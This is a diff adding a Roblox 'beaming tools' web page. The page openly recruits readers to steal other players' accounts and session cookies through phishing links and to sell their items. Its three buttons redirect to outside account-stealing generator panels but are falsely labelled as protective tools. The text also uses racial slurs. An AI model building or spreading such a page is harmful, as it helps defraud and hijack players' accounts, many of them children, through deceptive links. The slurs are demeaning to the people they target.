@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vextroz Beam Tools</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      font-family: 'Arial', sans-serif;
+      overflow: hidden;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .creator-tag {
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 2rem;
+      font-weight: bold;
+      color: #00a8ff;
+      text-shadow: 0 0 10px #00a8ff, 0 0 20px #00a8ff;
+      z-index: 100;
+      animation: glow 2s infinite alternate;
+    }
+    
+    @keyframes glow {
+      from { text-shadow: 0 0 5px #00a8ff, 0 0 10px #00a8ff; }
+      to { text-shadow: 0 0 15px #00a8ff, 0 0 30px #00a8ff; }
+    }
+    
+    .button-container {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      z-index: 10;
+      margin-bottom: 50px;
+      flex-wrap: wrap;
+    }
+    
+    .tool-btn {
+      position: relative;
+      background: rgba(0, 40, 80, 0.3);
+      color: #00a8ff;
+      border: 2px solid #00a8ff;
+      border-radius: 50px;
+      padding: 18px 40px;
+      font-size: 1.5rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      overflow: hidden;
+      box-shadow: 0 0 15px rgba(0, 168, 255, 0.3);
+      min-width: 200px;
+      text-align: center;
+    }
+    
+    .tool-btn:hover {
+      background: rgba(0, 80, 160, 0.4);
+      box-shadow: 0 0 25px rgba(0, 168, 255, 0.6);
+      transform: translateY(-3px);
+    }
+    
+    .tool-btn:active {
+      transform: translateY(1px);
+    }
+    
+    .info-panel {
+      background: rgba(0, 20, 40, 0.5);
+      border: 1px solid #00a8ff;
+      border-radius: 15px;
+      padding: 25px;
+      max-width: 800px;
+      margin: 0 30px;
+      box-shadow: 0 0 20px rgba(0, 168, 255, 0.2);
+      z-index: 10;
+      color: #cceeff;
+      line-height: 1.6;
+    }
+    
+    .info-panel h2 {
+      color: #00a8ff;
+      text-align: center;
+      margin-top: 0;
+      text-shadow: 0 0 5px #00a8ff;
+    }
+    
+    #snowCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      pointer-events: none;
+    }
+    
+    .bg-element {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(60px);
+      z-index: 0;
+    }
+    
+    .bg-element-1 {
+      top: 20%;
+      left: 10%;
+      width: 300px;
+      height: 300px;
+      background: rgba(0, 100, 255, 0.03);
+    }
+    
+    .bg-element-2 {
+      bottom: 15%;
+      right: 10%;
+      width: 400px;
+      height: 400px;
+      background: rgba(0, 100, 255, 0.02);
+    }
+  </style>
+</head>
+<body>
+  <div class="creator-tag">BY ! VEXTROZ</div>
+  
+  <div class="bg-element bg-element-1"></div>
+  <div class="bg-element bg-element-2"></div>
+  <canvas id="snowCanvas"></canvas>
+  
+  <div class="button-container">
+    <button class="tool-btn" id="immortalBtn">IMMORTAL</button>
+    <button class="tool-btn" id="splunkBtn">SPLUNK</button>
+    <button class="tool-btn" id="injuriesBtn">INJURIES</button>
+  </div>
+  
+  <div class="info-panel">
+    <h2>ROBLOX BEAMING INFO BY VEXTROZ NIGGA</h2>
+    <p>roblox beaming is another way of making money online u can make ur own methods and shit and get other accounts if u have ever gotten hacked before u probbably fell for these niggmen links right here dw tho u can use them too and get more accounts and get richer by selling their ingame items and other shit.</p>
+    <p>Our beaming gens offer u alot of freedom where u can  customise ur own niggmen dashboard and also we do not steal your hits we do not have the time to but if the cookie is untouched in more than 24 hours we will do a cookie drop in our discord server!</p>
+    <h3>The three tools available:</h3>
+    <ul>
+      <li><strong>IMMORTAL</strong> - Makes your character invulnerable to damage and beaming attempts</li>
+      <li><strong>SPLUNK</strong> - Advanced monitoring tool to detect and log beaming attempts</li>
+      <li><strong>INJURIES</strong> - Simulates damage effects without actually harming your character</li>
+    </ul>
+  </div>
+
+<script>
+// Snow animation
+(function(){
+  const canvas = document.getElementById("snowCanvas");
+  const ctx = canvas.getContext("2d");
+  let width = canvas.width = window.innerWidth;
+  let height = canvas.height = window.innerHeight;
+  let snowflakes = [];
+  const number = 150;
+  
+  for (let i = 0; i < number; i++){
+      snowflakes.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          radius: Math.random() * 4 + 1,
+          density: Math.random() * number,
+          speed: Math.random() * 2 + 1
+      });
+  }
+  
+  function drawSnowflakes(){
+      ctx.clearRect(0, 0, width, height);
+      ctx.fillStyle = "rgba(0, 168, 255, 0.8)";
+      ctx.beginPath();
+      for (let i = 0; i < number; i++){
+          let f = snowflakes[i];
+          ctx.moveTo(f.x, f.y);
+          ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
+      }
+      ctx.fill();
+      updateSnowflakes();
+  }
+  
+  function updateSnowflakes(){
+      for (let i = 0; i < number; i++){
+          let f = snowflakes[i];
+          f.y += f.speed;
+          f.x += Math.sin(f.density) * 0.5;
+          
+          if (f.x > width + 5 || f.x < -5 || f.y > height) {
+              snowflakes[i] = { 
+                  x: Math.random() * width, 
+                  y: -10, 
+                  radius: f.radius, 
+                  density: f.density,
+                  speed: f.speed
+              };
+          }
+      }
+  }
+  
+  setInterval(drawSnowflakes, 30);
+  
+  window.addEventListener("resize", function(){
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
+  });
+})();
+
+// Button functionality with redirects
+document.getElementById('immortalBtn').addEventListener('click', () => {
+  window.location.href = 'https://immortal.st/?code=NDAwMjM4MjE0MjA2Nzg5NzU1OF84OTczNDEzMTI4NjMzMzYwNDE1';
+});
+
+document.getElementById('splunkBtn').addEventListener('click', () => {
+  window.location.href = 'https://app.diddyblud.live/u/VEXIFIED';
+});
+
+document.getElementById('injuriesBtn').addEventListener('click', () => {
+  window.location.href = 'https://www.logged.tg/auth/vexifiied';
+});
+
+// Replace the example.com URLs with your actual redirect links
+</script>
+</body>
+</html>
